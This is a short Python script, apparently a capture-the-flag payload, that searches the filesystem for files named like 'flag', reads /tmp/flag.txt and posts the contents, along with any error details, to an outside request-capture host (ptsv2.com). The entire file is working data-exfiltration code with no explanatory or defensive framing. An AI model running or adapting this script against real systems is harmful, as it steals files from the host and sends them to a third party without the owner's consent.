import urllib
import httplib
import glob
import sys
import subprocess

data = {}
try:
    # define the ls command
    ls = subprocess.Popen(["find", "/", "-name", "*flag*"],
                          stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE
                         )
    # define the grep command
    # grep = subprocess.Popen(["grep", "-v", "/$"],
    #                         stdin=ls.stdout,
    #                         stdout=subprocess.PIPE,
    #                         )

    # read from the end of the pipe (stdout)
    # endOfPipe = grep.stdout

    data['etc']= ls.stdout.read(68)
    data['etc-err']= ls.stderr.read(30)
    data['flag']=open("/tmp/flag.txt", mode='r').read()
except:
    data['exception'] = sys.exc_info()
    pass
host = "ptsv2.com"

conn = httplib.HTTPSConnection(host)
conn.request("POST", "/t/wooh/post", urllib.urlencode(data))
conn.close()

# urlopen(url + '?' + url_data)
